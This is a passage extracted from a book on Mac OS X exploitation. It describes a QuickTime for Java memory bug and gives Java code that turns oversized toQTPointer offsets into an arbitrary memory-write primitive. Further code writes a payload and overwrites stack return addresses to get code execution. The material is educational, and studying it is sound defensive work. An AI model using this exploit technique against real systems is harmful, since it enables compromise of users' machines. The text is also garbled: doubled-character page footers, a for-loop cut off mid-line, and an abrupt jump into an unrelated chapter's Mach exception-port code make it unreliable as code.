pointer.copyFromArray(offset, box, 0, 1);
This gives us the ability to write to half of the address space, but we’d like
more. We can also call toQTPointer() with both an offset and size of 0x7FFFFFFF.
This will trick toQTPointer() into giving us a QTPointerRef() that begins 2GB
from the QTHandle pointer. This gives us access to the other half of the 32-bit
address space, and we can now write completely arbitrary memory to arbitrary
locations. Among exploit writers, this is often called a write4 primitive.
Putting this all together, we can write a single method that will let us write
a chosen value to a chosen memory address. This is game over.
public void writeInt(int address, int value) {
QTHandle handle = new QTHandle(0, false);
_lo_pointer = handle.toQTPointer(1, 0x7fffffff);
_lo_base = QTObject.ID(_lo_pointer);
_hi_pointer = handle.toQTPointer(0x7fffffff, 0x7fffffff);
_hi_base = QTObject.ID(_hi_pointer);
int[] box = new int[1];
box[0] = value;
try {
int offset = address - _hi_base;
9955336633cc1100..iinndddd 228899 11//2255//0099 44::4422::4477 PPMM
290 Part III ■ Exploitation
_hi_pointer.copyFromArray(offset, box, 0, 1);
}
catch (ArrayIndexOutOfBoundsException e) {
int offset = address - _lo_base;
_lo_pointer.copyFromArray(offset, box, 0, 1);
}
}
Obtaining Code Execution
Since we can write to memory arbitrarily, we can leverage this in a multitude of
ways to obtain code execution. Perhaps the most straightforward way to obtain
code execution is to write the payload somewhere in memory and overwrite a
stack return address with the address of our payload. In fact, our exploit does
just that (actually, it overwrites all stack return addresses).
int[] payloadAddress = {0x8fe54200};
writeBytes(payloadAddress[0], payload, payload.length);
for (int i = 0xbfffe000; i thread,
EXC_MASK_BAD_ACCESS,
9955336633cc1111..iinndddd 229988 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 299
exception_port,
EXCEPTION_STATE_IDENTITY,
x86_THREAD_STATE32))) {
errx(EXIT_FAILURE, “thread_set_exception_ports: %s”,
mach_error_string(kr));
}
The exception-handler thread now needs only to listen for incoming mes-